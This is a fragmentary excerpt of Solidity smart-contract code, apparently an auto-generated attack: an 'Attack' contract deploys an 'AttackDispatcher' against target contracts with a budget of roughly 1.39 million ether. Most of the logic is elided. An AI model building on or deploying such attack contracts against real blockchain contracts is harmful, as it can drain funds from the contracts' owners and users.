 ...
 * parameter. Make sure to send at least 1389583 ether and 428246967424122881 wei to the attack
    ...
    function _dispatch() public returns(bool) {
        ...
        if (state == 0) {
            if (id == 4) {
                ...
                uint value = 0x1264177f55e1430500000;
...
contract Attack is AttackManager {
    ...
    uint constant REQUIRED_BUDGET = 0x1264177f55e1430500001; /* equals 1389583 ether and 428246967424122881 wei */
    ...
    function reset(address payable[] memory _targets) public onlyOwner payable {
        ...
        rstate_state = 0;
        rstate[0] = 0;
        subs[4] = new AttackDispatcher{value: 1389583428246967424122880 }(4, _targets);
    }
